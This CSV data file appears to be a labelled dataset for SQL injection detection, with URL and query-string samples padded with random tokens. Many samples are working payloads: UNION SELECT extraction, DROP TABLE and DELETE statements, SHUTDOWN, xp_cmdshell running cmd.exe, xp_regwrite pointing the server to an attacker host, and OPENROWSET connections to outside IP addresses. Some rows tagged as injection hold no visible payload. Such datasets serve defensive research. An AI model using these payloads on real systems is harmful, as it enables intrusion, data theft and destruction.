id,class,vector
18426,SqlInjection,Du6uNokytegAss=slarmor&ro=eFbTJ&egd13=re84&hoaweh=gknAc&cbnoatMenta6=eqne&seeeytwn3ne1nlj=e_Lx&giaHaeeNtfje=0444&tsoqa6meetvs=tqpuy'fi i&xs4mHTsqdb=6&orobubno=8040&macahlhia=1813200&f7=77952&7rnhuftqo2=tngroup by'&lehaysieatsyt=7827&5leaeaa=os(]'s0evalostmpechoObo
18495,SqlInjection,tlheapte=H&hOxaoNounsaNt=fxYUpcO&4erpfaeppwlmegs=whcs'&tdt1Qh5nk=8uro&du69torba=oP c&eota=3316&shli='    UNION        ALL    SELECT    rhc     FROM    HsLsEtahF   WHERE    '' =   '&idsuscsasSu1au=nPs&tz5cnfN0oiel=Ia&emZBr4Wx=058489
18564,SqlInjection,/hTl8HazAT4pmXmdqJen/rcbehsyl/sc/nrMD2H8PYpPYY-gkJDA/aFs6_Orw7IQ20/nwkiEhKNXP2NSQfL7.htm?na=328077&d1enlehv=%3B++++select+*+++++from+OPENROWSET%28%27SQLoledb%27%2C%27uid%3Dii%3Bpwd%3DeEsstohrud%3BNetwork%3DDBMSSOCN%3BAddress%3D10.115.5.32%2C50719%3B%27%2C%27select+++*++from+++it2nytjhts%27++++%29&bandtTBXxQpg=mn&-3Uxs6sg=sNn9o8aaA&eMaaccf=eEGwlh%40PadK
18566,SqlInjection,/telnetrid/twx/pformnGQF9u8i/tlLilVWTPknXreg44/ChPZ_Q1/jhcatO_LbQp..tiff?5s5Terh=imgsoa%3DFlynull&elfOresswhvrar=dUk8dd&tr=ppN&smeltxdetkwa=971335938&7hfel=5&select98orTjUHymeta=297151417&Ln=w5agroup+bynn9divnform&dstngsp=gr4u&oee2csrbtLglml=it5i&ovxsCtnnela=%27%3B++++drop+++table++++admin&vISAe8=98&lPsmZxaF=ttmr0ashutdownyEos%3C+%3B
18587,SqlInjection,/icz9Y@ka0-/hxeHe/LrXlTz/22LDCjQVnFwe/o8b5O1mP6wvQ2d/rFEUHTuTfYis/i1E.js?ebtyednjea=17905010&pftjdidsyhEeop1=do9dY50atedx00onge&ry=c4-IZika8-&emocd=9ygEDh&A3aadhdeav=hS6DIu80&towAia=%27+++++OR+++%27tnAodqcao%27+++%3D+++%27+++&CfromId@BasTsdocument=n-ohlsncenva2y&tesisu2egmt=na&7LPd69WzGJI=taEnig&H9E70=19869&Ynfytves=ial&HtNdDyehistntae=nwSOgwi2&tta7bsdrstiod=7&6Erhwanm=819136&gc5itieh8oR=o%7E%3E%26m%3EuhupdateriTwHl%3Dosy-
18591,SqlInjection,/V5Robjectyadminf2m/twoid8sgdxnoasphmn/hLermcThigptjownl/u6y/45@6@wE8abdH3j/90zK7pifTqq1/f.us.q4/eFDmaB7w/eCe.gif?getnieywEmliTa=tl6y&arurukty=dl%24ms+tgtuoa%40rtn%3A1s&sfxopereodWdxan=cM8ac1ean%27+UNION+ALL++SELECT+++sr++FROM+++nossLstdOn++++WHERE+++++%27%27+%3D+%27&6copyHObH=edvSe&qynaoeaturi=ab9
18599,SqlInjection,/quw/R1gJ05NUaccess_logH@MmlS/cCHHJ0GiGPSgO/iedetreesemtlnmA/iXkUBmrtB7/scU4.lX-H1OJt6dLoZ7/0.fVvhttp/n0d2mKboot.inij7/h2Mv/n2tSielrd3mFTtc/lEad/y45.cgi?
18682,SqlInjection,/3ybDYGPmN/nxiiioNm7oamwiilwtai/dRPEtxUwzFb5r77/fSFacai/sdEfl/cSoaYNw/7UIy/rO1qX5jcs0cnE.NzXw/meSIvpHgO0-/s7doroEibo6Oa8pgiaJ/sZlb3px/oe5w2Lh.pl?where.eprocessing-instructionR=nPxp6B&gs=782&U44HewthoRaug=7maile8%26%40dqqu&e1hBPr5QIRK=1tfceSenm97eprcpo&5spatn=41&96idd1nulyzsi=%27+++++OR++%27sdfadaeti6v%27++++%3D++++%277A3u%27%2B%27a5%27&tmCxeestgeelsHv=q%3D%5Cc
18712,SqlInjection,/es/t-/s6/emdr/0phG7y/3jmKP_selectaNM@wO/WsIJL5DLstdinh_Uxg/wDRi-w/aZOB/h3roal2ir.shtml?ese9nnNc2xe=OdefU3ls5nauS&air2ff=exec+++xp_regwrite+++++%27HKEY_LOCAL_MACHINE%27%2C%27SOFTWARE%5CMicrosoft%5CMSSQLServer%5CClient%5CConnectTo%27%2C%27inyenet%27%2C%27REG_SZ%27%2C%27DBMSSOCN%2Chackersip%2C80%27&biohtmso=le%26wclrrttr
18719,SqlInjection,/da8iailet3u/rmvar7rTPnxxmlTwhere@Otmp/ee/sriodnesfeGiizeAadm/4pghdswaEbO1n0nS9nr/0nall7R9UduOftpKcat/acw.IAPWK3vIPf/hI0o9/wXVo0vJqvbscriptV-.png?ohehqEiAat=4&gnu=aon7IWU&9Iyrmis=eoraeeonn8spml&hiEb1ontioa6=33766429&reTsdbdniftdhla=%5CjUl+muot&likeBRnu7h5dTin=rMEPD_2B&Y4-G3F1=bpTjzvjyQLF&aftzoaphLmt=or++++0%3C%3E%28select+++count%28*%29++++from++tovnq%29
18721,SqlInjection,/J_dILdiWfDfQOr/e2VixqZiEtc/eiyD2Wy5TVpeBocQdZ/lDP05/tebeewaoen4lo/tNa3/9da6zrwindow.openVnbsall./jYfZUebmGOo/t4rrrlwtnEhassrhetal/kaAn@KtJ5/ruiosl3ihtEeo.swf?whEB71aehst8e1t=%7Eoak&gzetcDvdraI-=11&tmsy6tTrFa=s8oYx
18797,SqlInjection,stylewoF2BIi=' OR   'enrnttaas'    >  'S&AgnlHm0Od=ddbnlesrt tilak&tssyahl5rTufe4=documentaxdGlrgscu 0s2Spiu&mbtachEdhivdh=162
18800,SqlInjection,/jVRplF/tuIuxy/gUyAO7X.AG.2MED./6Yboot.inidocumentHNGOK/enavalLdlnmb95njpa.cgi?nbs=yaoimap6yoj&XCQ@P=dr7um9nHC&fIkuusERw3=%7Ckto%27qp%3Atdggroup+by&dmrn5Bm2yer0=%27++%29+UNION++ALL+SELECT+++++ysfb2ant+++++%2C++++tpiso+%2C++xsoi+++FROM+++++ei8pVtlcq+WHERE+++7oAn0t+++NOT+IN+%28+%276rTtnpalt%27++++%29+AND++++ltspn+++++NOT++++IN+++++%28++++%27mc%27++++%29+++++AND+++%27%27++++%3D++++%27&u4gkao=478555
18818,SqlInjection,/r6hdKqj5B-oQmj.tiff?ABAnodewmL=OR++++%27sstXg%27++%3D+++++N%27+++++%27&vehoniig=ptiphphn%25oatad&CTWtF=7991&iiecgeh=161&hsnoedndI=rti
18901,SqlInjection,/9ygpatGp0669a8t7ep/bgsound@KEpusIk6kNj/8p3H20mq/cD4zvGzuPobv/6WCdpKkl0LVU_/eo/pic9/gW/fckBj1X9o2bif-f/op/iE3ROxCqS.UG5/pzSY9wp-8wLpGp.html?J4hkp=oKedSZoRaY&srhw=i0v&g4OaRnat9na8na=rsu7&ehr=%40mperlmgks&yrWV-K0=8vilAAbgsoundran%27orsuqsc0u&NOvK@nD6Q=%27++++%2B++%28++SELECT++TOP+++++1+++SM++++FROM++b1ddhc%29+%2B++++%27&inbs=+5qescriptiMastyles+vw&nfswg9en=hem&like4F0f.6o=lst7wazwmenk&tYHNg65Z_-=bae4eathlko&r9dadtf=nenilloneaj&52=nIyhttp&hshiadrmtf=xnt+&gnasey168d=r+xZfot-&tkae4s=8794
18903,SqlInjection,"iqyteetohisTn=703700&tmeatibas=8025470108&4nteeabg=')     UNION ALL     SELECT   aai ,     wrehooE   ,   htdc  FROM rs     WHERE  1zdr NOT     IN    ('rs'  )   AND eos    NOT    IN  (   'N6TeeU') AND  ''  = '&orseeeeo=mE:2a&cterlaciq=eit&Q0ybin8w=netcatai&G.ZOJQj=t92sWQ1L6&Rot@5mhtacces.Z0=Hejx&2mAb=rpsana2Nre7"
18905,SqlInjection,/dRrR/euhsoni48nysh1/dMXAwM/joaaau4Bhg1/eeY7snpomu6idphTe0ap/5g6cUzJXy9XQ6H/z2loesnlnm/Raconnect/m84P/rxOUOa.tiff?ludin5Netc=67808&dKluiEoohi7=eiar&SbincU=fneoer
18946,SqlInjection,/soynqzaodeanda/@2fxCn/s6tvwfjpabrw/iUy/yh6umeuvhLMtmahsrBo/tboPsKmIFhVnQ9PGz-/p.gtiSa1z-Gb3i_3lCN/Dtuee0hlmu2lmt4.tiff?xJqX4aS=oMiWCakx&dhn=uQmY%27++%29%3BDELETEFROMusersWHEREupper%28username%29++++%3Dupper%28++%27admin&htrncclxfd9tir=+%3F&g4ZiEstdin=withtpassnsdnvcmg&Eq9C90kldeleteNoG=1851&eEzke2=ohl9eeLot&fTrl=954&soen=rw+&w9F3Pr=eshS
18950,SqlInjection,/K9E.asmx?lnaends9lot9o=54199&hrrao0=tee%5C&dn1amnu=Atotw&syzG_=%3B+EXEC%28+++%27INS%27%2B%27ERT+++++INTO+users+values%2879%2C%277ipeenrah%27%2C%27ark5rdpc%27++++%29%29&8sEwi6mesrm5=24&g5=63&g_vk=37&k88emtohotiTt=dlirn&ehllPw3=hI&et0rOeie=+&s52oferYaeg=254&5tliaR=30&lettgAdaG=eJB3EezyVMBQ&tcqajcdthNblnr=m%5Dtupdater
18983,SqlInjection,/hiaoitim93ilnkuaa/sro/libJ0ja0@svlX/6K6kzrS/ewe48dxthHA2nr/lVw2MBa1rtc2/oD.jpg?eii=7182407&benjezoeoa=oqas&qbftpt@Nt=select+gyDiuer+from+++ALL_USERS&6jXAYLORN=6180434&uin=Slinkaatfe2t&QvpLNOM=r%3Cfnnc%260NdstD&-ZAlogC=eweai&9R2q1Z=48097595&Cpstur=Bp
18995,SqlInjection,/sXZJPTZl9e3jvLj2gFD/s4SwMuwHdaY9tC-GVdM/X7k@CmB/oWw@mXm5h/tZVKn4ntUDpGF/t1oLj1M@vld/Hzl9ctoom/l1Orp3Rx/mimgzUQl5lI2z/kGq0acatc0a7/oo.gif?rz8ssl6tf=%27%3BEXEC+master.dbo.xp_cmdshell++++%27cmd.exe&Cn11hiiogrh=ieoa
18996,SqlInjection,/nat/alotqt8hg7reaTU/ehoosehsnseaeydnwntl.dll?nhhmlndisoi=utyorhactrit&KEePE=un++a+e&so4cyso=%27++++%29++++UNION++++ALL+++++SELECT++nblTQ+++++FROM+++odt+++WHERE+++++%28+++%27%27++%3D%27&fduakhysii=itvl&bs8oO8o0=83&F3duehre=Mgi7moa&ha2y=788&ieh=paol9&ovr0ua=f&fo.PuYR=%27%2Be%25uC5&4jeaioUoue6jdtr=5tg6Auyoa%3F+art+7roJ%3C&ledtcoeaoodriye=48282&eeeR=processing-instructionaconnect
19042,SqlInjection,/IU.js?gogm5z6Kae=31&_LC4s=8635604477&nnechec=Rhgef&abQK=3668625&tz=bgsoundMma+&f@Fn=aO+c%27&Em=ew6SVGh5n1N&nc4orer=%27%3B+++++shutdown--&hnnrim=bs9&prru6=n%3D6r&rymnWbos=817522&Kpa9.2.u0w=vacavld6%24&bdThtijed=nr%40uSdz
19056,SqlInjection,/oa/oDN22FMhI6GtaVUf_g2/imoC5vPxN@cql/ttnbMahf/tki2/RxKaab1bIuoGdfut/lfepA4gOeqatnrdmgq/tElnegjhn/iWH/GYnetcatkU/pD1xh4p/Y5DqUunionEmoFG.jpg?E7cptroxCdin=ie%28dw%2Bni&ZT8zYFnph-T7I_=%27++++OR+%27tew3w%27++BETWEEN+++%27R%27++++AND+++++%27T&wsdpo7he61=Ed%40t
19096,SqlInjection,/s96/0pYYmfbpasswdJBp/6sCP2Ey3@PMLFX/dIQO3S2a_0atk/bk5FlB09KjS2wd/00Lwindow.openTSxTNs/ererioeptua/ouiErlecte3eoi/t2lu.mspx?v.4I=pgpaaa+6nnph-fenph-rlzasock_streamn&ix=3&nTdeoav=rt&wrqe=362&ciid9tlhrtic=%27++%29%2F**%2FUNIONALL%2F**%2FSELECT%2F**%2F632%2F**%2FFROM%2F**%2FfNhel2y5%2F**%2FWHERE%2F**%2F%28++%27%27++++%3D+++%27+++++%2F**%2F&eilg=C+&sndltiyoFznnH=eaviht&QF9ZSJy-VwC=-c%2B%3Dwinnt
19188,SqlInjection,/jfistelea5toesjme/rusnmrwse0/aopgfsoehlisslknbr/ttiakykc/u6r6YlkbOp.jsp?8ot0h5icfe=chairs%27++++UN%2F**%2FION++++SEL%2F**%2FECT+++++rsr+++++FROM++++dba_users++++WHERE+ins+++like++%27%2525&vvI9La=22kkp&gzknitmhvi3=281&i7pw=tariodeOlzetEDrqnn&zuy=form+y&sNerRJ6A.Tr=-doSs9wtreNos0&0nH=704854&3CUepercdid=8403&ou=3367013&dam08=vdaehnpep0dr&cmd-sock_streamym=3ranjhh&nttadotn=m&seflwi=azrsen
19208,SqlInjection,/Oarsere4ssY/RtttHhi/heeqcvruxyR/scriptWP/iLZHrupqTJdz0AxvY/wraietstttfnqn/adminnscriptS83d5allG/dietra1axmlhTn/uiairIL/7VFJjKY/f@Ofg9F/wXK4g.shtml?0syotaWn=exec+++++xp_regwrite+%27HKEY_LOCAL_MACHINE%27%2C%27SOFTWARE%5CMicrosoft%5CMSSQLServer%5CClient%5CConnectTo%27%2C%27oeeaenHoI%27%2C%27REG_SZ%27%2C%27DBMSSOCN%2Chackersip%2C80%27
19214,SqlInjection,/s./ouie3a.jpg?feTsytcEP=a7CqSl1iY&yaatfs30q=9432134&tl=2916332&jggincludeYAf=uatue3e4axhpie3&socaa5rinhse06=%27+++OR++%27nnerreitf4r%27+++%3D+%27phe%27%2B%27mralxeu%27&edu=49245&ijflocationYJnetcatGH9R=2856352580
19253,SqlInjection,/a1bhmusVz_AlrVhdF9A/M2TRnVxK/vwf8ruurisooto8t0u/tM6cbkEuO/vdltm4ccnbE3cinartha/ec/fWXHhvbscriptMYbin5r/t7TmWahaV5x8oTlB/Cpr5uer0/itb8sanTdrsn/rxKoDE.htm?hrjEdedaee=wrrrE%25teiwr2ni&e7retthnlo=sxC&ah1a=6100&nihshs=1428099&ec0heeLkf9u=%27+++union+++select++sum%28mdreo%29++++from+++qscraw--&oermhreyT3Hre=9774&oprettd=07&iFdocumenteMuamEH=4owei&lpsat5saenr=0707&rralIIsm=cOL&7roHiwewdgdwx=h8
19278,SqlInjection,/xazrgn.mspx?uahos=7t%3B&atx=ialxp_eMedaaiee&Rachn9osbar=48147941&l8aa=snF&8t7sf=felygE%5Ce&eauisShe=exec++++xp_cmdshell+%27%222eg%22+++%3E%3E++script.vbs%27&biiX4tesDlee1m=713038&ehrcsear=530
19291,SqlInjection,/oh0erfeiHwDmnohd.php3?lexd=691930&lanjz=3190&srborgcn=8&etrqyec5e6embas=%27+%29+UNION++++ALL++++SELECT+++638%2C7%2C0692%2C5804%2C9350++FROM++omsrco++WHERE++%28+%27%27%3D+++%27&dekteaydsmd=ck9%3Chlwtsuzf9
19319,SqlInjection,/IMu@zPZtkQ2uLz@/NailTheuevaiatIsakmn/S.gb/SKP81mlocationj/e0oexdooeisddc/i6neabt/twAxQnEA9YOh/thnxhhtn1eseetnS0wct/dzRoQ7sKXe/ifuihlln/o2weScnS/%u8Nwinntw.jpg?vbscriptDWdropNYl.=OR++%27ore%27++LIKE++++%27Sim%25%27&OQ_-p0L=33
19333,SqlInjection,/DMu/cning8kuyruhhgimo/YLpgDDP2AXZ./3IQ8MRBN-KW2bUgCAFk/xoEaAvbytdt/f9shsmm1neDnnioci/epKv.lCwKSdlXRl-Bcl/tJwTDnedbU.V4z@8eKF/ee9mtamxirhsom0se/jfi/7QmTSz4LVoCzJCjrzBRL/eueoe5hGtDrt.html?x9aeltn=81432514&eo=OR+++++%275net%27+BETWEEN+++%27R%27+++AND+++%27T%27&nregluer=otakDeo&5kipo3mnItzlT=4293946&7staepifn=dcEMi8&9A3=ejdvx&1rpcegidww=obm1reyrxe
19408,SqlInjection,R3=eQ.MPeKaavtg&ehv2v=h7Teer8yietbsiCtoi&yeTeni5nxsWeais=joptb&nldgaharl=p6sr3wehmaelqte&epMtm=97&w5jean=nVT&N0n=1wE
19432,SqlInjection,/hnd/bhD7ignWpSZ/ePcxv_IMJBt1qGIsi/ie/etha5dIYctnas9estzn/elngb/lo7P2l-EVNZFPLtL/hWA-QB6S7dwVVBk/zperlR/tsmn/3Rtdtniibkeesbh/PYwaA-GS.mdb?SrlOrta3r=1tomAaM2qsa&neeetlzsd=8296&nehiarMl=fli&ttnax=oGQmkbat&hAndhsacQcc2=70567&bRp=1700623&etfsehtaeswn=d2V_0n&ga8dctVha=872981335&cyeogn=9&7sTH6jmh=nn6&wdnftw=hu1ls7Oyisoioay&nzz=t8
19440,SqlInjection,/Sglmeucrdbue3rrmllau/HI4OSpswnsZwwibgsound_/dtynagouig/tzmlass1/ilorodmesoruTrsn/nrudAlrcwkatixaes/ib2ewdyeaX/xW/eeSetBsw.html?oehees8ootjahz=%40ot&sUsrn01hnteodiu=75188&a1alarNr=8571429&BjK-cjLconnectQ=%27%3B+EXEC+++master.dbo.sp_makewebtask+%27c%3A%5Cinetpub%5Cwwwroot%5CRremcrn.js%27%2C++++%27SELECT+++ws+++FROM++oymyBh++++WHERE++xtype%3D%27%27U%27%27%27&oAZGZzJv=623
19446,SqlInjection,/ttnidlehA/de5./libchxaqi/rIsbnaEn/ye/sHtFi/@qPd5_5R8pkbg/%uGW/c@tD7d2PcDqj55j@..exe?lisitoscnnOi=443772&ut2bpassthruidfOY_K=7588530368&phpUhA.KF=%27+++%2F**%2F++++OR+++%2F**%2F+++++%277esl6h%27+++++%3E+++%27S&sw=32746
19454,SqlInjection,/2fmei9nnh/-zZHNhriTsam@-/r7NUb28JrEHfV6-nI/e9PRE/jyK6kT/ytq/orknth0eoroOeheedTd/wtGEc0cnxZWq/eYiQ/bXe.jpeg?prluoaiheriol4e=62720471&rlliuhi4gt=u593hIap2rms%26E1&aat6no3ee=ashutdownt8echo&nONshlrs=96526911&cr=csrhmxieE&uoaeepsderoh=noNo+skposition+ihgneo&ls6X=76077&oeaajythi=fnmd&MNinsertWJscriptupdateqx=rI2_RwC1VFfI&rebd=nxVe%27+UNION+++%2F**%2F++SELECT+++ognwan++++FROM+dba_users+WHERE++O6reiypm++++like+%27%2525&bhscdodsae1se=Eh&Eeh4dfotT=8594023&ona=nvOx_BK&hMeyyty5=eariAf35idlhn2eea1&ichhcot5ph=6Aft
19487,SqlInjection,/US/JkoxVDl5oRu/eD87FPH/e.DqmIVq4_.css?roLeissimeer=1&ueefRstqw2edi=-n&nuRte7xwtesi=%27+++++OR+++%27tlIrakheh%27+++++LIKE+++%27aze%2525&28d=8tsRE0rowgrdp&6sfy8et=szRltcz%402r&eosrlastenttrE=rfadh&Fyty=1996&tuqu5n=%25%26+hibande%28lvbscriptlscs+t4ya&eefnslEa=328&oyh7bRel01e4isb=130Pa8Ulq%40C&amharc=76gfeoRXtN&etnOjlht=136&thS4omosip4lh=882199&tin=nnissN2tlomje%3F%7Cg&76UyE=7
19511,SqlInjection,isvnaeeusaby=lformKreplacex6gi0 &da7swticddte=6753&srtReoittbYtesn=256179&zrn9sf19yq=nurseesg&e98orvOo=053830&hlcsaAR=oaccepthaue&Ngottabgdoexarg=' AND USER_NAME()='eaun&ah11nahonl=9Dree6h&carhaicmuirWa2=>t>h&txdhllrE=mxjat&sasg3=m@V&amW5nanephdm=7xoi&ehm2dhhgahaxeer=sojkouQAtslh5&htsc=b&zRgcsF=761
19524,SqlInjection,/n1bdklr/oO0mkZkPxHluKK/anGxXFFxQkt/mebhe/en5cslnnyl1ljtTcAtyn.php3?Gfi=exec++xp_cmdshell++%27%22abreNhEnEH%22+++++%3E%3E+script.vbs%27&f8zYYY=e&eviitydptx1=948864&d6E36cAnerBd=56&gFpkN7bin=uA7&qoe3asymp=62&enxanbm2dno6iN0=794523&ecgtde=aidfhtg&lvepeVs3oeaetmf=nJC5W6TDa&Jfd7qH=9859&YiPCsUoftp=hhvtedetinhey5n&aeygttobyeip=opdCe0tnneeta&bgsoundYformeRB46ftpbN=eaDiAtheql&.U-bgCKV7=805902
19525,SqlInjection,/2U5TFClTfc/allP/uN-jlz/o8gwPdnKr/z2/ytnsu9jTs7oifSNIz/tettoAuynjxhNtsnAli/sX.dll?smJfaccess_log0abetweenZzZDL=oUBkoUB_PbJ&eqaht=eval2ogwp-o%29+Tiontmpeyr2o%3D&sularp9ue=338031&ajnd2n=33&heecmiir6=chairs%27++++UN%2F**%2FION+++++SEL%2F**%2FECT+++++37esstsrif+++++FROM+dba_users++++WHERE+++++tb++++like++%27%2525
19625,SqlInjection,/zb9rYQbpAvXh7iAECdpP.jpeg?f5ersuaacac5eC6=0DG1h.BKW-vf&kW5nph-MBinsert3=oah&iqa=r4ian&siaisrhJn5meyiE=nutsapOTingo&xie7ats=679114&ttcaeies=n9jz8m&hnsdk7cLeey6=ilaeh&yehnbtaso=TizhS5%29sock_stream&net3saaht0ena=eihrtda&gjni=0aats%3Be&It=235&cileo=-deleteEeaP0siy&tkiiiB=a0lazen
19626,SqlInjection,/eMskBq-0OB7/CVXEpYo9MhttpsusrUuwp/lSCAtBm9xrEi7IONQF/emNkmM@GlY@B-7f_u/gwi.htm?hco8n=%27%3B++shutdown--&aAdselis=82972366
19637,SqlInjection,/oTL/ctiqsetuixnArwlreu.shtml?larrorghiaii=892&iaeaEtbp9B=0995&e7nz=%27%3B++drop+table++++admin&_DXdiv=ela1eeth&K99z7r=419&rhIR=aL50
19667,SqlInjection,/7X/nosaSadlnoqtiRimtti/nds6mtNi2-GyBezwk/tkF6VKIt7iau/fh-CI5m8I-/s6MkJ_NKfg.shtml?ne=1+ipassthruh&ielsytiv=exec+++xp_regwrite+++%27HKEY_LOCAL_MACHINE%27%2C%27SOFTWARE%5CMicrosoft%5CMSSQLServer%5CClient%5CConnectTo%27%2C%272oenDthqh%27%2C%27REG_SZ%27%2C%27DBMSSOCN%2Chackersip%2C80%27&Eat7ne7dO=b%26++%24%2BEanina%3Ectm%29
19712,SqlInjection,/Aew3farenst/okBUP/kJo/t0qY7L368GjzShvwmf/rr/grPVJ.Zb3Q/wtq2gZWl/tsidceptddxdawy/fettejnht3DhnssnlEd.html?yFTvp.mreplace=%27++++%29++++UNION+ALL+SELECT++95+FROM+sd2sdny+WHERE+++%28+++%27%27+++%3D+%27
19716,SqlInjection,/dapcnat2i6r.shtml?Osr77re=aEGapdV-&d7esY=%27++union+select++%40%40version%2C1%2C1%2C1--&htiu=0v+hssnoh%5B
19776,SqlInjection,/eefGpQGrKIWU3r_rIVu/asfgoat8.png?tnniekw4aerd=49&ontsathemuee0=%3B+++++insert++into+++OPENROWSET%28++++%27SQLoledb%27%2C%27uid%3DidaItiHshn%3Bpwd%3D1iithatr8%3BNetwork%3DDBMSSOCN%3BAddress%3D80.85.37.180%2C1433%3B%27%2C%27select++*+from++++_sysdatabases%27++++%29%3B++select++++*+++from+++LinkedOrRemoteSrv1.master.dbo.sysdatabases&qcrerBut1r=5952&tgeti6hr=wM7d6QZ
19780,SqlInjection,trdne='  OR 'dioa'   =  N'  &nmgasetro2=qwindow.open0w+&siAaah=~&s7deletetgzsamgchildwdJ=7etaHog<veeA&elun=&wh4execni8a8&ftnsrnlsrA=t
19793,SqlInjection,rdfm9ip=e&eedn=7546244&yroederntrOe=rsnn&AxoyI6gNfeeml=dA&7nEnss0ldaF6ycz=OR  'olzn4ar'  =     'Sim'+'ple'
19808,SqlInjection,/oA/Sn4aAS3tt5utar3oe/svY/ecsdsaeaptcti7za/eweemelnlgnr8hrna/ilV-KTZ3iXSZaky/0yha9YEPVlVPFGrM/ncPrsipdj/nek0yoxun8umru/5gNb0qrSngqaSsaA6el/uY/e6IsroihaSsm1p.tiff?Mn6l=Fe&wUBZWPreplace5=q&lstdinNt=%27++++%29++UNION++++ALL++++SELECT+++++1%2C8455%2C1%2C63%2C0+FROM+++ar+++++WHERE+++%28++++%27%27++++%3D++++%27&fatet5ent6=txrtr&owaoniiooatslt=6057914536
19825,SqlInjection,/dsqWcigZDu9iknpu-Jau/x3ShQK7K/ewd/ee0schjpaLItYdtoj/Ibtiqivk3leEmg/nu3gseutrgalo/syneErrY1acnryUd6fr.gif?tee=otost&ereohhTn6=uhmmt1%26%27m+ck6a%5Blikeel%5B%7E&re49ds=07946006&htpasswRM=25&6bKDq9WeyG=1mtT6nd&erepi=0365140&i2osnsngls8=ioareai0&icer=o%25a&Ont=32057&etwl4g1neru7e7=%27+++%29+++++UNION++ALL+++++SELECT+++++wa+FROM+++neone++++WHERE+++%28++%27%27%3D++%27
19901,SqlInjection,/1HYUSAK/ouHRpeVeh8SiYE6-TJm/eTf0t12elrhfayit.htm?ZJ8body=to&tgaii5=object&IaShnmeid2a=8560530&ht6iMan=edropt%2FahJa&eIfl=%27++++or++id++in++++%28+select++*++++from+++++user_db++++%29&muut1feiabfropi=m&eTa=ois&rH4iotnnonwoo=u%5De&kter6ehafyaeecn=887&ndtotpihmygbsCe=tecoll3te&aotzne=o7%28a&o2eckkci4inq=2025&auamf=721854744&aDtwsitweitp6Ta=ueEpsneiNeNtg
19921,SqlInjection,/e_/Uf/homeu_3Un/EeoycbeotRuiNlneerdg/r2ee6de.mdb?
19939,SqlInjection,/ntL1yolntnrdor/8rlocationSreplaceDnc4-FJ/caandf.php?1wgetqhNVUx=ievasht&arioo7thboHglt0=%27+AND+USER_NAME%28%29%3D%27qrdos&dn9Tunsbnrebuf=49&nhzantpe=4betiansisaMZ6O&mtNncorin=aeO
19983,SqlInjection,/b2K93moC-ZtMk8xbVO/hnvoof/aEhzG.1plQ/ahh5d9tnyAg/9npslraiannr/utWqiRT0ryrrevkey.html?9i=ti%29oytmt&cVBOc3=485656&inhlww=AND+++++ascii%28lower%28substring%28%28SELECT++++TOP++++1+++sen9zu+FROM+sysobject+++++WHERE+++xtype++++%3D++++%27U%27+++%29%2C1%2C1%29%29%29++%3E++111&ohniiphuy9npefu=aooboot.inie-lSsa&orabeE0Ohtrffdr=6947&tereueerL=31214220&Oleq=5013292&eCotsH=t3aeelike
19989,SqlInjection,/sh/r1/e9MEHEzPCzpN3.YvH/eUq02/lod4_m863oF_GrMtMEE/iv.NQiUNTJORo/szAstee/hWXdPBDH./gQBuf/m1Sform.shtml?Mtmpd1v=%3B+select++*+++++from+++OPENROWSET%28+++%27SQLoledb%27%2C%27uid%3DHlenseas%3Bpwd%3DcnztaA%3BNetwork%3DDBMSSOCN%3BAddress%3D159.5.136.244%2C62986%3B%27%2C%27select+++++*+++from+++++2satr0g%27++%29&fe=entoacagyi5ldcee&htTnooKsmitY8=p%3Ebhttp9r6jt3%25u9a1hi&Dayh383tt8qmF=ks7location2%3BiS%24%40body%25asjx7e&hgsbyn2jnF=m2Ab&nn1nptduut=oc.gDejv&nbsr0gbnE=1414577&wPeiMl=3328&esein=NcatmrmdcReS&ekqXenhelgwCaO=e%3Aw8aMdasafmpzhsc&f9sWpimgkincludenaHq=winnt+4r&@yr27uuV6execJ=ifhoeleir9uclshTt&ts8ielor7qmdmtE=0VkLeTwAKyXs&gttehtafit=ora
19990,SqlInjection,/w-Udi/9@/r0/htiqivIfcdnqe5Ad/fpGNu/uOKV5cfOJbawQ3xRNNq/eo/oc9Qe/eFHRzFa_jmGZ/iwr/sj77Nrs1OaGXPiyJ.css?dlplj3rsunv2ntw=saheuj&FLqf_1J1=ndsceNjyArnrie&iDoKaI=lefieotnk&uedagxTth=%26dzhtdde6&8qeoptmt=%3Fm&sai=%27%3BEXECmaster.dbo.xp_cmdshell%27cmd.exe&ihneSp36byvntt=978204
